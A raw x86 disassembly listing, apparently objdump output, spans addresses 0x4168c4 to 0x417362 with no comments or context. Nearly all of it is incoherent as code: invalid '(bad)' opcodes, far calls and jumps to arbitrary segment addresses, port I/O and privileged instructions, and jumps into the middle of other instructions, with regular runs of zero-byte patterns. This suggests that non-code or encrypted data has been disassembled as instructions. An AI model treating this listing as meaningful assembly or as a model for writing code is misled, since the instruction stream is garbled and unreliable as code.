  4168c4:	push   edx
  4168c5:	test   ch,cl
  4168c7:	cwde   
  4168c8:	mov    ebp,0x3d983c48
  4168cd:	mov    al,ah
  4168cf:	ret    0x4073
  4168d2:	sar    BYTE PTR [ecx+0x170b82cb],1
  4168d8:	push   cs
  4168d9:	lock and ebp,DWORD PTR ds:0x17a4703a
  4168e0:	gs dec edx
  4168e2:	xchg   BYTE PTR [esi+0x391a61da],bl
  4168e8:	jbe    0x4168b3
  4168ea:	jne    0x416908
  4168ec:	pushf  
  4168ed:	add    eax,0x0
	...
  416956:	shr    DWORD PTR [edi-0x4810cfa],1
  41695c:	cmc    
  41695d:	scas   eax,DWORD PTR es:[edi]
  41695e:	sub    DWORD PTR [edi-0x5d],edi
  416961:	mov    ebp,0xc0176298
  416966:	repz add BYTE PTR [bx+si],al
  41696a:	add    BYTE PTR [ecx],al
  41696c:	add    BYTE PTR [eax],al
  41696e:	adc    ch,BYTE PTR [esi+0x9]
  416971:	(bad)  
  416972:	xchg   esi,eax
  416973:	mov    ebx,DWORD PTR [edi]
  416975:	sbb    al,0x79
  416977:	xchg   esi,eax
  416978:	jl     0x4169cc
  41697a:	inc    ecx
  41697b:	jmp    0xbd5ba66
  416980:	xchg   ebp,eax
  416981:	xchg   BYTE PTR [ebp+edx*2+0x46],dl
  416985:	xchg   esi,eax
  416986:	and    edi,DWORD PTR [edx]
  416988:	rol    BYTE PTR [ecx+0x7d6e78e1],0x52
  41698f:	sbb    eax,0x872b326
  416994:	dec    esi
  416995:	lds    ecx,FWORD PTR [ecx+0x67c86624]
  41699b:	prefetch BYTE PTR [eax+0x59c8b4d6]
  4169a2:	cli    
  4169a3:	xchg   ebp,eax
  4169a4:	inc    eax
  4169a5:	cmp    al,0x8
  4169a7:	jge    0x416a0f
  4169a9:	sbb    ebp,DWORD PTR [ebp+eiz*1-0x17c1680d]
  4169b0:	fimul  DWORD PTR [edx]
  4169b2:	ds cmp bl,bh
  4169b5:	fild   WORD PTR [eax-0x34b33f60]
  4169bb:	je     0x4169ad
  4169bd:	lods   eax,DWORD PTR ds:[esi]
  4169be:	cli    
  4169bf:	jnp    0x416a36
  4169c1:	in     al,dx
  4169c2:	bound  edi,QWORD PTR [esi]
  4169c4:	out    0xbe,al
  4169c6:	mov    esi,0xc9d1047
  4169cb:	fnstenv [edx]
  4169cd:	mov    edi,0x2075229c
  4169d2:	jmp    0x416957
  4169d4:	xor    BYTE PTR [esi+0x4c],al
  4169d7:	arpl   WORD PTR [ebx-0x702957dc],bp
  4169dd:	aad    0x1f
  4169df:	ds cmc 
  4169e1:	ret    
  4169e2:	fs ret 
  4169e4:	and    esp,eax
  4169e6:	rol    DWORD PTR [edx+0x63],0x86
  4169ea:	mov    ecx,DWORD PTR [esi-0x25]
  4169ed:	fwait
  4169ee:	test   al,0xc1
  4169f0:	ret    
  4169f1:	jl     0x4169f5
  4169f3:	std    
  4169f4:	out    0x53,al
  4169f6:	pushf  
  4169f7:	mov    ecx,0x54daf95a
  4169fc:	call   0x4f98c4a2
  416a01:	inc    esi
  416a02:	iret   
  416a03:	mov    ds:0xdc49bd33,eax
  416a08:	sbb    ch,BYTE PTR [eax+edx*4-0x2f]
  416a0c:	push   ss
  416a0d:	pop    esi
  416a0e:	add    DWORD PTR [ebx-0x21682bc1],0x2f3ea8f5
  416a18:	and    BYTE PTR [eax],dh
  416a1a:	sub    eax,0x4cf4af1d
  416a1f:	add    al,0x64
  416a21:	mov    ds:0xaf70ce28,al
  416a26:	inc    ebp
  416a27:	scas   eax,DWORD PTR es:[edi]
  416a28:	push   esp
  416a29:	jmp    0x96dfefa6
  416a2e:	pop    ecx
  416a2f:	loopne 0x416a92
  416a31:	xchg   ecx,eax
  416a32:	xchg   edx,eax
  416a33:	pop    ss
  416a34:	and    eax,0x306e5ad7
  416a39:	call   0x43dd:0x26b7ad6c
  416a40:	shl    BYTE PTR [ecx-0x6a17ff3f],cl
  416a46:	scas   eax,DWORD PTR es:[edi]
  416a47:	out    0xea,al
  416a49:	es jnp 0x416a86
  416a4c:	loop   0x4169e4
  416a4e:	out    0x54,eax
  416a50:	dec    esp
  416a51:	pop    esi
  416a52:	or     al,0x84
  416a54:	pop    ecx
  416a55:	popf   
  416a56:	cwde   
  416a57:	pop    edi
  416a58:	scas   al,BYTE PTR es:[edi]
  416a59:	icebp  
  416a5a:	adc    BYTE PTR [esi-0x3b],al
  416a5d:	pop    ebx
  416a5e:	in     al,0x68
  416a60:	dec    ebp
  416a61:	inc    edi
  416a62:	pop    ss
  416a63:	jecxz  0x416a10
  416a65:	pop    edx
  416a66:	sub    DWORD PTR [ecx+0x5391b9de],edx
  416a6c:	and    BYTE PTR [edx+0x0],0x0
	...
  416ad4:	add    BYTE PTR [eax],al
  416ad6:	retf   
  416ad7:	pusha  
  416ad8:	ror    BYTE PTR [ebx+0x60dbbbfb],1
  416ade:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416adf:	mov    al,ds:0xc51c0ba3
  416ae4:	inc    ecx
  416ae5:	fs addr16 hlt 
  416ae8:	add    BYTE PTR [eax],al
  416aea:	add    BYTE PTR [ecx],al
  416aec:	add    BYTE PTR [eax],al
  416aee:	je     0x416b2a
  416af0:	adc    BYTE PTR [edi-0x1d],dh
  416af3:	popf   
  416af4:	dec    ch
  416af6:	inc    ebp
  416af7:	daa    
  416af8:	and    bh,BYTE PTR [ebx-0x2877caf2]
  416afe:	mov    dl,0x6a
  416b00:	cmp    al,0x4d
  416b02:	aam    0x85
  416b04:	je     0x416aef
  416b06:	retf   0x60c4
  416b09:	xor    al,0x6d
  416b0b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416b0c:	shl    DWORD PTR [esi+0x66ef44aa],cl
  416b12:	call   0x5cea:0x75b1d4cf
  416b19:	pop    ss
  416b1a:	retf   0xd0bd
  416b1d:	imul   ebp,DWORD PTR [ebp+0x178c566d],0x3c
  416b24:	jg     0x416b49
  416b26:	dec    ecx
  416b27:	(bad)  
  416b29:	jmp    0x428e:0xa03f0711
  416b30:	fisttp QWORD PTR [ebp+0x78e761af]
  416b36:	mov    ds:0x9724b436,eax
  416b3b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416b3c:	lods   eax,DWORD PTR ds:[esi]
  416b3d:	into   
  416b3e:	pop    es
  416b3f:	ror    DWORD PTR [ecx+0x54a9fc19],1
  416b45:	add    al,0x53
  416b47:	dec    ebp
  416b48:	sbb    eax,0x95856d3a
  416b4d:	gs push eax
  416b4f:	loopne 0x416b98
  416b51:	paddw  mm1,QWORD PTR [edx]
  416b54:	sbb    dh,BYTE PTR [ecx]
  416b56:	and    al,0x26
  416b58:	in     al,0x7b
  416b5a:	pop    esp
  416b5b:	mov    DWORD PTR ds:[ebp+0x4db88031],ebx
  416b62:	(bad)  
  416b63:	fcom   st(6)
  416b65:	imul   ebp,DWORD PTR [ecx+ecx*4],0x1c
  416b69:	mov    ds:0xb8c33f7f,al
  416b6e:	pop    esi
  416b6f:	jne    0x416af8
  416b71:	jge    0x416bdf
  416b73:	adc    DWORD PTR [ebx-0x1e2ef93d],0x117ab359
  416b7d:	loope  0x416bf2
  416b7f:	jl     0x416b41
  416b81:	hlt    
  416b82:	or     DWORD PTR ds:0x6df7c584,0xffffffb8
  416b89:	mov    WORD PTR [edi],ss
  416b8b:	xchg   esi,eax
  416b8c:	cwde   
  416b8d:	mov    bl,cl
  416b8f:	inc    esi
  416b90:	loopne 0x416c06
  416b92:	mov    edi,0x18d69817
  416b97:	xor    eax,0x706d9f30
  416b9c:	ror    BYTE PTR [ebx+ecx*4-0x48],0x9
  416ba1:	jo     0x416b39
  416ba3:	xor    esp,DWORD PTR [edi-0x6a]
  416ba6:	das    
  416ba7:	sbb    BYTE PTR [ecx+0x6a8b7faf],cl
  416bad:	shl    DWORD PTR [edx-0x1a9a4dbe],0x7b
  416bb4:	(bad)  
  416bb5:	fs out dx,al
  416bb7:	loope  0x416b5f
  416bb9:	xchg   BYTE PTR [ebx-0x718568a2],al
  416bbf:	pop    ds
  416bc0:	aas    
  416bc1:	adc    eax,0xfaaf2e89
  416bc6:	mov    ah,0x5a
  416bc8:	stc    
  416bc9:	inc    eax
  416bca:	cmp    al,0x7
  416bcc:	sub    eax,0xda3e25ac
  416bd1:	mov    al,ds:0x315981e8
  416bd6:	mov    DWORD PTR [edx+0x4c3bba6e],esi
  416bdc:	sub    eax,0xdb0a95bc
  416be1:	xor    al,BYTE PTR ds:0x64adf26c
  416be7:	retf   
  416be8:	cmp    DWORD PTR [edx],edi
  416bea:	jns    0x416c47
  416bec:	and    edi,edi
	...
  416c56:	jecxz  0x416cbd
  416c58:	push   cs
  416c59:	test   DWORD PTR [esi-0x38a0401],0x7f5b70a9
  416c63:	xor    eax,0xf567a122
  416c68:	add    BYTE PTR [eax],al
  416c6a:	add    BYTE PTR [ecx],al
  416c6c:	add    BYTE PTR [eax],al
  416c6e:	mov    edi,0x3df2af6e
  416c73:	xor    BYTE PTR [ebp-0x79],dh
  416c76:	mov    eax,ds:0x448c3e63
  416c7b:	adc    eax,0x3ec636df
  416c80:	retf   0x7f5e
  416c83:	popa   
  416c84:	mov    edx,0x98f70088
  416c89:	icebp  
  416c8a:	sub    dl,cl
  416c8c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416c8d:	stos   DWORD PTR es:[edi],eax
  416c8e:	mov    ebp,0x2da48561
  416c93:	cs jg  0x416cf6
  416c96:	xchg   esp,eax
  416c97:	test   eax,0x6b9b159c
  416c9c:	ja     0x416cd3
  416c9e:	sar    BYTE PTR [ecx+0x4667e474],1
  416ca4:	cmp    dh,BYTE PTR [ecx]
  416ca6:	xchg   edx,eax
  416ca7:	dec    ebx
  416ca8:	retf   
  416ca9:	jne    0x416cdf
  416cab:	adc    DWORD PTR [ecx+0x283a950e],ebp
  416cb1:	xchg   edx,eax
  416cb2:	loopne 0x416c34
  416cb4:	cdq    
  416cb5:	dec    ebx
  416cb6:	mov    ds:0x5fab4290,al
  416cbb:	xor    ah,BYTE PTR [eax]
  416cbd:	int    0xb7
  416cbf:	cmc    
  416cc0:	enter  0xcb8e,0x32
  416cc4:	mov    ebx,0xbe01257
  416cc9:	loop   0x416c72
  416ccb:	jnp    0x416c68
  416ccd:	jmp    0x16ac:0x892adc65
  416cd4:	imul   eax,DWORD PTR [edi-0x5b],0x2ddcd3b0
  416cdb:	loop   0x416ce1
  416cdd:	cmp    ebp,DWORD PTR [ebp*2-0x48e48853]
  416ce4:	push   ebp
  416ce5:	jns    0x416d65
  416ce7:	popf   
  416ce8:	push   ss
  416ce9:	inc    eax
  416cea:	xor    cl,BYTE PTR [edx-0x64]
  416ced:	int3   
  416cee:	mov    esi,esi
  416cf0:	pop    edx
  416cf1:	or     cl,BYTE PTR [eax]
  416cf3:	dec    edi
  416cf4:	(bad)  
  416cf5:	and    al,0xce
  416cf7:	jmp    0x2f31fdb3
  416cfc:	xor    bh,BYTE PTR [edi+ebp*4]
  416cff:	push   es
  416d00:	bound  ecx,QWORD PTR [edi-0x45]
  416d03:	lds    edx,FWORD PTR [ebx+0x3b]
  416d06:	fs push esp
  416d08:	je     0x416d3e
  416d0a:	dec    edx
  416d0b:	pop    ebx
  416d0c:	and    eax,0xf386bcd
  416d11:	fnsave [ebp-0x4a]
  416d14:	xchg   edx,eax
  416d15:	pop    ebx
  416d16:	cmp    DWORD PTR [edx],0x33
  416d19:	hlt    
  416d1a:	cmp    DWORD PTR [ecx],0xfd155f94
  416d20:	sbb    eax,0x35170608
  416d25:	cmp    ah,bl
  416d27:	dec    ebx
  416d28:	mov    ds:0xbaaee184,al
  416d2d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416d2e:	jb     0x416cd5
  416d30:	and    eax,0xb5af4be
  416d35:	adc    DWORD PTR [ebx-0x19b9f547],esi
  416d3b:	add    eax,0x84537196
  416d40:	pop    ebp
  416d41:	mov    ebx,0xdfb7f79b
  416d46:	(bad)  [esi+0x0]
  416d49:	mov    bl,BYTE PTR [ecx]
  416d4b:	in     al,dx
  416d4c:	xchg   esp,eax
  416d4d:	sub    BYTE PTR [eax+0x26bed7f9],dh
  416d53:	push   es
  416d54:	jae    0x416d05
  416d56:	add    al,bh
  416d58:	jbe    0x416d83
  416d5a:	aaa    
  416d5b:	lods   al,BYTE PTR ds:[esi]
  416d5c:	mov    ecx,0x74a68d63
  416d61:	pop    esi
  416d62:	(bad)  
  416d63:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416d64:	sub    BYTE PTR [ebx-0x4c],ch
  416d67:	data16 (bad) 
  416d69:	clc    
  416d6a:	mov    ds:0x1f42e0,eax
	...
  416dd3:	add    BYTE PTR [eax],al
  416dd5:	add    BYTE PTR [ecx],ah
  416dd7:	xchg   ebx,eax
  416dd8:	mov    DWORD PTR [edi-0x60d84045],ebp
  416dde:	mov    ch,0x99
  416de0:	pop    edx
  416de1:	das    
  416de2:	xor    eax,0x673f9d5d
  416de7:	test   BYTE PTR [eax],0x0
  416dea:	add    BYTE PTR [ecx],al
  416dec:	add    BYTE PTR [eax],al
  416dee:	lods   al,BYTE PTR ds:[esi]
  416def:	push   es
  416df0:	fmul   st,st(4)
  416df2:	outs   dx,BYTE PTR ds:[esi]
  416df3:	lds    ebx,FWORD PTR [eax-0x751c5d08]
  416df9:	rcl    BYTE PTR [esp+ebp*8+0x766037b],0x28
  416e01:	dec    eax
  416e02:	pop    ebx
  416e03:	add    dl,bh
  416e05:	jb     0x416dd4
  416e07:	jbe    0x416db6
  416e09:	rcr    DWORD PTR [esp+ecx*8+0x32aa10f8],cl
  416e10:	pop    esp
  416e11:	fmul   st,st(7)
  416e13:	loop   0x416e26
  416e15:	std    
  416e16:	mov    bh,0x4d
  416e18:	pushf  
  416e19:	jge    0x416dc7
  416e1b:	sub    ah,dl
  416e1d:	test   BYTE PTR [esi-0x7f7795c7],bh
  416e23:	sub    bl,BYTE PTR [ecx]
  416e25:	(bad)  
  416e26:	cli    
  416e27:	cmp    eax,0x10ebf6fe
  416e2c:	sub    edx,esp
  416e2e:	mov    al,0x34
  416e30:	test   DWORD PTR [edx-0x2a45116e],edi
  416e36:	test   BYTE PTR [edi],bl
  416e38:	xchg   BYTE PTR [edx],cl
  416e3a:	lods   eax,DWORD PTR ds:[esi]
  416e3b:	inc    eax
  416e3c:	ins    BYTE PTR es:[edi],dx
  416e3d:	test   DWORD PTR [ebx+edx*4+0x780332a7],0x7572cec0
  416e48:	shl    BYTE PTR [eax],cl
  416e4a:	jle    0x416e2e
  416e4c:	cmp    ebp,ecx
  416e4e:	popa   
  416e4f:	rcl    DWORD PTR [esp+esi*8],0x98
  416e53:	xor    esi,eax
  416e55:	mov    DWORD PTR [ecx],edx
  416e57:	pop    edx
  416e58:	or     DWORD PTR [edi+0x64],0x968b876
  416e5f:	int3   
  416e60:	cmp    eax,0xccad0024
  416e65:	ds cmp dh,dh
  416e68:	popf   
  416e69:	out    0xdd,eax
  416e6b:	outs   dx,DWORD PTR ds:[esi]
  416e6c:	sbb    edx,edx
  416e6e:	adc    edi,DWORD PTR [ecx-0x49]
  416e71:	cmc    
  416e72:	inc    ecx
  416e73:	lods   eax,DWORD PTR ds:[esi]
  416e74:	inc    ebp
  416e75:	imul   ebx,DWORD PTR [edi],0xffffffc5
  416e78:	and    eax,0x7de45f2f
  416e7d:	add    DWORD PTR [ebx],esi
  416e7f:	call   0x11ec:0xa71ab183
  416e86:	add    al,0x9
  416e88:	shl    BYTE PTR ds:0x1d4ccbc7,0x39
  416e8f:	dec    esi
  416e90:	retf   
  416e91:	jmp    0xf60360dc
  416e96:	mov    ebx,0x9cfeadf2
  416e9c:	stc    
  416e9d:	ret    
  416e9e:	not    eax
  416ea0:	in     eax,dx
  416ea1:	mov    dl,0xd1
  416ea3:	loope  0x416ee9
  416ea5:	das    
  416ea6:	mov    ah,0x64
  416ea8:	hlt    
  416ea9:	fld    DWORD PTR [ebx]
  416eab:	hlt    
  416eac:	mov    BYTE PTR [ebx+0x593ec7c1],ah
  416eb2:	call   0xee1a:0xbd8ea8a
  416eb9:	out    dx,eax
  416eba:	sbb    BYTE PTR [esi+0x74],0xf0
  416ebe:	out    0x6e,al
  416ec0:	inc    edi
  416ec1:	mov    dh,0x67
  416ec3:	lods   eax,DWORD PTR ds:[esi]
  416ec4:	je     0x416ec9
  416ec6:	mov    DWORD PTR [edi+0x6e068714],edx
  416ecc:	lea    ecx,[edi]
  416ece:	out    dx,eax
  416ecf:	jno    0x416f0a
  416ed1:	mov    al,0x35
  416ed3:	cmp    dh,BYTE PTR [ecx-0x6994965e]
  416ed9:	pop    edx
  416eda:	or     eax,0x9d22aba9
  416edf:	gs in  al,0x3
  416ee2:	jl     0x416e71
  416ee4:	cmp    BYTE PTR [edx],ch
  416ee6:	gs dec esi
  416ee8:	ds test eax,0x57775e4a
	...
  416f56:	mov    edi,0xae6d8e19
  416f5b:	(bad)  
  416f5c:	(bad)  
  416f5d:	fucomi st,st(0)
  416f5f:	xor    eax,0x2778eea
  416f64:	dec    esp
  416f65:	xchg   DWORD PTR [edi-0x9],esp
  416f68:	add    BYTE PTR [eax],al
  416f6a:	add    BYTE PTR [ecx],al
  416f6c:	add    BYTE PTR [eax],al
  416f6e:	or     eax,0xa5d469c1
  416f73:	pop    ebx
  416f74:	pushf  
  416f75:	push   ebx
  416f76:	clc    
  416f77:	enter  0xcc72,0x28
  416f7b:	fnstsw ax
  416f7d:	retf   
  416f7e:	jmp    0x416fac
  416f80:	push   esi
  416f81:	cmp    DWORD PTR [ecx+0x21],edi
  416f84:	cmp    cl,cl
  416f86:	in     eax,0xe5
  416f88:	into   
  416f89:	daa    
  416f8a:	jg     0x416f95
  416f8c:	or     dl,BYTE PTR [esi+0x28]
  416f8f:	adc    al,0xd1
  416f91:	xchg   edi,ebx
  416f93:	push   ecx
  416f94:	push   edi
  416f95:	addr16 pop ebx
  416f97:	neg    DWORD PTR [edx+edx*1]
  416f9a:	jbe    0x416fbd
  416f9c:	or     eax,0x39d564b9
  416fa1:	mov    edi,0x9df20edb
  416fa6:	xlat   BYTE PTR ds:[ebx]
  416fa7:	ror    BYTE PTR [ecx+0x1c12af44],1
  416fad:	and    bh,BYTE PTR [ebp-0x18412525]
  416fb3:	inc    esi
  416fb4:	dec    ecx
  416fb5:	out    0xbb,eax
  416fb7:	pop    eax
  416fb8:	int    0x77
  416fba:	jo     0x416fb6
  416fbc:	cmp    BYTE PTR [eax],ah
  416fbe:	pop    ecx
  416fbf:	test   BYTE PTR [ebx-0x57],0x7e
  416fc3:	jecxz  0x416f68
  416fc5:	arpl   si,si
  416fc7:	sbb    eax,0xbd1dc2f8
  416fcc:	xor    al,0xde
  416fce:	dec    esi
  416fcf:	xor    cl,BYTE PTR [ebx-0x5a182a28]
  416fd5:	add    al,0x87
  416fd7:	xchg   esp,eax
  416fd8:	push   ss
  416fd9:	bound  edi,QWORD PTR [ebx-0x572b01a9]
  416fdf:	xchg   edx,eax
  416fe0:	pop    ebp
  416fe1:	push   es
  416fe2:	data16 scas al,BYTE PTR es:[edi]
  416fe4:	mov    al,ds:0xb3f090f4
  416fe9:	fmul   st(2),st
  416feb:	xchg   ecx,eax
  416fec:	dec    BYTE PTR [ebx]
  416fee:	int3   
  416fef:	inc    ecx
  416ff0:	pop    esi
  416ff1:	mov    bh,0xbb
  416ff3:	jns    0x417044
  416ff5:	xchg   ecx,eax
  416ff6:	popa   
  416ff7:	mov    cl,0x9e
  416ff9:	pop    eax
  416ffa:	sbb    dl,BYTE PTR ds:0x18df865e
  417000:	cmp    DWORD PTR [edx-0x6922ab45],ebx
  417006:	jle    0x417049
  417008:	push   eax
  417009:	inc    ecx
  41700a:	lea    ebx,[eax+0x4e9bc520]
  417010:	pop    edi
  417011:	xor    eax,DWORD PTR [edx-0x4f]
  417014:	in     eax,0x76
  417016:	cli    
  417017:	push   0xffffffb0
  417019:	scas   al,BYTE PTR es:[edi]
  41701a:	mov    ebx,DWORD PTR [ecx-0x17bd2bec]
  417020:	and    BYTE PTR [ecx-0x107e951b],bh
  417026:	sbb    ah,BYTE PTR [eax+0xff11e3b]
  41702c:	pop    ss
  41702d:	or     ebp,DWORD PTR [eax+0x57f37421]
  417033:	loope  0x41700d
  417035:	jns    0x4170a8
  417037:	std    
  417038:	push   ds
  417039:	and    al,BYTE PTR [ecx]
  41703b:	or     al,0xff
  41703d:	add    BYTE PTR [ebp-0x74],dl
  417040:	jecxz  0x417030
  417042:	scas   eax,DWORD PTR es:[edi]
  417043:	sub    bl,bl
  417045:	arpl   WORD PTR [bp+si+0x73c9],bp
  41704a:	arpl   WORD PTR [edx-0x47],bx
  41704d:	ffree  st(2)
  41704f:	ret    0x1fb9
  417052:	hlt    
  417053:	ja     0x417049
  417055:	dec    ebx
  417056:	cmp    BYTE PTR [edx],ch
  417058:	pop    edx
  417059:	daa    
  41705a:	or     eax,0xd00fc170
  41705f:	nop
  417060:	jno    0x416ffc
  417062:	scas   eax,DWORD PTR es:[edi]
  417063:	xchg   esi,eax
  417064:	fbstp  TBYTE PTR [edi-0x2adaa0f7]
  41706a:	fstp   DWORD PTR ds:0xa83e
	...
  4170d4:	add    BYTE PTR [eax],al
  4170d6:	jbe    0x417105
  4170d8:	push   ebp
  4170d9:	inc    ecx
  4170da:	pop    edi
  4170db:	jns    0x417153
  4170dd:	aas    
  4170de:	(bad)  
  4170df:	loopne 0x4170d5
  4170e1:	sub    esi,DWORD PTR [ecx]
  4170e3:	(bad)  
  4170e4:	aam    0xa3
  4170e6:	addr16 clc 
  4170e8:	add    BYTE PTR [eax],al
  4170ea:	add    BYTE PTR [ecx],al
  4170ec:	add    BYTE PTR [eax],al
  4170ee:	sbb    BYTE PTR [eax-0x2d292561],ch
  4170f4:	dec    ebp
  4170f5:	ss ins BYTE PTR es:[edi],dx
  4170f7:	sbb    eax,0x1c691fb6
  4170fc:	add    DWORD PTR [ecx-0xd],eax
  4170ff:	clc    
  417100:	cmp    edi,DWORD PTR [edi]
  417102:	mov    cs,WORD PTR [esi-0x268cdbb]
  417108:	push   ds
  417109:	retf   0x9b84
  41710c:	icebp  
  41710d:	in     eax,0x44
  41710f:	rol    ch,0xef
  417112:	fwait
  417113:	and    eax,0xd470106d
  417118:	jno    0x4170ee
  41711a:	jmp    0x714feb0a
  41711f:	repnz iret 
  417121:	pushf  
  417122:	repz fnstsw WORD PTR [eax-0x20]
  417126:	mov    ds:0x2594adc,al
  41712b:	mov    BYTE PTR [edx],cl
  41712d:	les    edx,FWORD PTR [ecx-0x2ff5848d]
  417133:	pop    ebp
  417134:	add    esi,DWORD PTR [edx+0x70]
  417137:	or     al,0x86
  417139:	jns    0x41711d
  41713b:	hlt    
  41713c:	je     0x4170eb
  41713e:	dec    esi
  41713f:	in     al,dx
  417140:	js     0x4171a8
  417142:	cmp    al,0xed
  417144:	aam    0xd8
  417146:	cli    
  417147:	inc    edi
  417148:	(bad)  
  417149:	sti    
  41714a:	xor    DWORD PTR [ebx-0x317f9e93],esi
  417150:	arpl   WORD PTR [ebp+0x6b],sp
  417153:	add    ecx,ebp
  417155:	test   al,0x7e
  417157:	mov    edx,0x804b6623
  41715c:	test   BYTE PTR [edi],ch
  41715e:	pop    es
  41715f:	jnp    0x4170e1
  417161:	pop    edx
  417163:	(bad)  
  417164:	leave  
  417165:	fwait
  417166:	loop   0x4171b8
  417168:	lahf   
  417169:	arpl   ax,dx
  41716b:	xchg   esi,eax
  41716c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41716d:	dec    ebp
  41716e:	clc    
  41716f:	xor    ch,BYTE PTR [edx-0x6e]
  417172:	shl    BYTE PTR [edi+0x30],cl
  417175:	xchg   DWORD PTR [edi+0x205bf9c9],ebx
  41717b:	jge    0x417175
  41717d:	add    BYTE PTR [eax+0x22],dl
  417180:	daa    
  417181:	mov    ch,0xc3
  417183:	push   0xffffffe8
  417185:	jb     0x417175
  417187:	ins    DWORD PTR es:[edi],dx
  417188:	fwait
  417189:	jno    0x417206
  41718b:	push   ecx
  41718c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41718d:	adc    DWORD PTR [ecx-0x624b7285],ecx
  417193:	or     dl,cl
  417195:	mov    edi,0x1a130b68
  41719a:	bound  edx,QWORD PTR [ecx+0x1aea5717]
  4171a0:	enter  0x613d,0x17
  4171a4:	push   ecx
  4171a5:	js     0x4171cf
  4171a7:	dec    ecx
  4171a8:	sahf   
  4171a9:	mov    ebp,0x74e829ec
  4171ae:	xor    DWORD PTR [ecx-0x9df168e],0xf0abb48a
  4171b8:	jo     0x417184
  4171ba:	dec    esp
  4171bb:	push   edi
  4171bc:	cmp    dh,cl
  4171be:	dec    eax
  4171bf:	imul   eax,DWORD PTR [edx-0xfd51795],0x68
  4171c6:	call   0x9ab2:0x43175319
  4171cd:	xor    BYTE PTR [ebx+0x31c98143],ah
  4171d3:	in     al,0x62
  4171d5:	mov    ds:0x343193a6,eax
  4171da:	inc    ebp
  4171db:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4171dc:	ins    DWORD PTR es:[edi],dx
  4171dd:	mov    cl,0xa
  4171df:	pop    esp
  4171e0:	push   cs
  4171e1:	ror    BYTE PTR [ecx+0x31],1
  4171e4:	imul   BYTE PTR [edi]
  4171e6:	push   esp
  4171e7:	xchg   edx,eax
  4171e8:	pop    ss
  4171e9:	cmp    eax,DWORD PTR [ecx]
  4171eb:	loopne 0x4171a3
  4171ed:	test   DWORD PTR [eax],eax
	...
  417253:	add    BYTE PTR [eax],al
  417255:	add    BYTE PTR [esi-0xe58fe7],ah
  41725b:	jnp    0x41724b
  41725d:	mov    ebp,0x986526a4
  417262:	dec    ebp
  417263:	inc    esp
  417264:	pusha  
  417265:	adc    DWORD PTR [edi-0x7],esp
  417268:	add    BYTE PTR [eax],al
  41726a:	add    BYTE PTR [ecx],al
  41726c:	add    BYTE PTR [eax],al
  41726e:	out    dx,eax
  41726f:	scas   al,BYTE PTR es:[edi]
  417270:	adc    DWORD PTR [eax],0x1be9fe62
  417276:	ret    
  417277:	ins    BYTE PTR es:[edi],dx
  417278:	mov    bl,0x36
  41727a:	pop    eax
  41727b:	push   ebx
  41727c:	aas    
  41727d:	xchg   edx,eax
  41727e:	lock call 0x34b8:0xb61c0417
  417286:	sub    esp,esp
  417288:	push   ds
  417289:	pushf  
  41728a:	dec    eax
  41728b:	xor    eax,DWORD PTR [esi]
  41728d:	punpckhbw mm0,QWORD PTR ds:0xd1fedc7d
  417294:	pushf  
  417295:	aad    0x69
  417297:	jg     0x417310
  417299:	mov    ds:0xd6752616,al
  41729e:	ins    DWORD PTR es:[edi],dx
  41729f:	in     eax,0x78
  4172a1:	mov    ah,0xcd
  4172a3:	or     bl,BYTE PTR [edi-0x29890319]
  4172a9:	pusha  
  4172aa:	or     al,0x5d
  4172ac:	fst    DWORD PTR [edx-0x43]
  4172af:	(bad)  
  4172b0:	outs   dx,BYTE PTR ds:[esi]
  4172b1:	(bad)  
  4172b2:	push   esp
  4172b3:	ficom  DWORD PTR [esi+0x33]
  4172b6:	push   ds
  4172b7:	mov    cs,WORD PTR [ebx]
  4172b9:	retf   
  4172ba:	lock test DWORD PTR [edi+ecx*2-0x6a],esi
  4172bf:	push   eax
  4172c0:	mov    ecx,0x80d11ec7
  4172c5:	dec    edi
  4172c6:	and    al,0x2c
  4172c8:	jno    0x417306
  4172ca:	pop    eax
  4172cb:	jle    0x417332
  4172cd:	add    eax,0xd2451564
  4172d2:	jns    0x4172d4
  4172d4:	push   edx
  4172d5:	lock imul edi,ebx,0xfb2419e8
  4172dc:	inc    esi
  4172dd:	cmp    ebx,DWORD PTR [eax-0x2f]
  4172e0:	mov    esp,0x2914a9dc
  4172e5:	inc    ebp
  4172e6:	outs   dx,DWORD PTR ds:[esi]
  4172e7:	jmp    0x417335
  4172e9:	out    0xb1,al
  4172eb:	cmp    BYTE PTR [esi+0x2963eb11],ah
  4172f1:	clc    
  4172f2:	in     al,0xff
  4172f4:	or     eax,DWORD PTR [eax]
  4172f6:	test   BYTE PTR [ebx-0x5615d2e2],bl
  4172fc:	adc    ebp,esi
  4172fe:	test   eax,0xa9380eb8
  417303:	sub    ecx,DWORD PTR [ecx-0x3e]
  417306:	jmp    0x417330
  417308:	pop    esi
  417309:	push   esp
  41730a:	add    edx,esp
  41730c:	aam    0xde
  41730e:	xchg   esp,eax
  41730f:	lods   eax,DWORD PTR ds:[esi]
  417310:	mov    al,0x9e
  417312:	(bad)  
  417313:	jp     0x4172e2
  417315:	mov    DWORD PTR ds:0x1db6e9f1,ecx
  41731b:	mov    esi,0xcfe9b803
  417320:	adc    al,0xa5
  417322:	mov    ah,0x76
  417324:	fist   WORD PTR [eax-0x47]
  417327:	pop    ss
  417328:	retf   0x5ea2
  41732b:	stc    
  41732c:	stc    
  41732d:	scas   al,BYTE PTR es:[edi]
  41732e:	jb     0x4172c2
  417330:	mov    DWORD PTR [edi+0x738c41ff],esi
  417336:	pushf  
  417337:	push   cs
  417338:	fdiv   st,st(4)
  41733a:	jmp    0x4173aa
  41733c:	fcmovnu st,st(5)
  41733e:	(bad)  
  41733f:	pop    edx
  417340:	shl    BYTE PTR [edx+0xe604f05],0x79
  417347:	cmp    eax,0x80b9f31f
  41734c:	jns    0x417351
  41734e:	out    0xd,al
  417350:	in     al,0x80
  417352:	cs mov ch,0x9d
  417355:	xchg   edx,eax
  417356:	cmp    BYTE PTR [ebp+0x18b55eca],dh
  41735c:	rol    DWORD PTR [ecx+ebp*8],1
  41735f:	push   edi
  417360:	daa    
  417361:	pushf  
  417362:	add    eax,0xfa26b645
